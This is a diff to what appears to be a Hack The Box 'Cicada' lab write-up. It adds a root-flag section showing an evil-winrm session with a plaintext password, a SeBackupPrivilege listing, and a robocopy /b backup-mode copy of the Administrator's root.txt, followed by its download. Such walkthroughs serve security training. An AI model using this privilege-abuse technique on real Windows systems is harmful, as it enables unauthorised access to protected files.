@@ -638,6 +638,7 @@ smb: \Users\emily.oscars.CICADA\Desktop\> get user.txt
 getting file \Users\emily.oscars.CICADA\Desktop\user.txt of size 34 as user.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
 
 ```
+
 evil-winrm output:
 ```bash
 └──╼ [★]$ evil-winrm -i cicada.htb -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
@@ -701,4 +702,90 @@ Mode                 LastWriteTime         Length Name
 Info: Downloading C:\Users\Administrator\Desktop\root.txt to root.txt
                                         
 Info: Download successful!
+```
+
+root flag:
+```bash
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeBackupPrivilege             Back up files and directories  Enabled
+SeRestorePrivilege            Restore files and directories  Enabled
+SeShutdownPrivilege           Shut down the system           Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> robocopy C:\Users\Administrator\Desktop C:\temp root.txt /b
+
+-------------------------------------------------------------------------------
+   ROBOCOPY     ::     Robust File Copy for Windows
+-------------------------------------------------------------------------------
+
+  Started : Friday, December 6, 2024 9:10:59 AM
+   Source : C:\Users\Administrator\Desktop\
+     Dest : C:\temp\
+
+    Files : root.txt
+
+  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30
+
+------------------------------------------------------------------------------
+
+	  New Dir          1	C:\Users\Administrator\Desktop\
+	    New File  		      34	root.txt
+  0%
+100%
+
+------------------------------------------------------------------------------
+
+               Total    Copied   Skipped  Mismatch    FAILED    Extras
+    Dirs :         1         1         0         0         0         0
+   Files :         1         1         0         0         0         0
+   Bytes :        34        34         0         0         0         0
+   Times :   0:00:00   0:00:00                       0:00:00   0:00:00
+
+
+   Speed :               2,266 Bytes/sec.
+   Speed :               0.130 MegaBytes/min.
+   Ended : Friday, December 6, 2024 9:10:59 AM
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> cd C:\
+*Evil-WinRM* PS C:\> ls
+
+
+    Directory: C:\
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         8/22/2024  11:45 AM                PerfLogs
+d-r---         8/29/2024  12:32 PM                Program Files
+d-----          5/8/2021   2:40 AM                Program Files (x86)
+d-----         3/14/2024   5:21 AM                Shares
+d-r---         8/30/2024  10:06 AM                temp
+d-r---         8/26/2024   1:11 PM                Users
+d-----         9/23/2024   9:35 AM                Windows
+
+
+*Evil-WinRM* PS C:\> cd temp
+*Evil-WinRM* PS C:\temp> ls
+
+
+    Directory: C:\temp
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-ar---         12/6/2024   1:27 AM             34 root.txt
+
+
+*Evil-WinRM* PS C:\temp> download root.txt
+                                        
+Info: Downloading C:\temp\root.txt to root.txt
+                                        
+Info: Download successful!
+
 ```
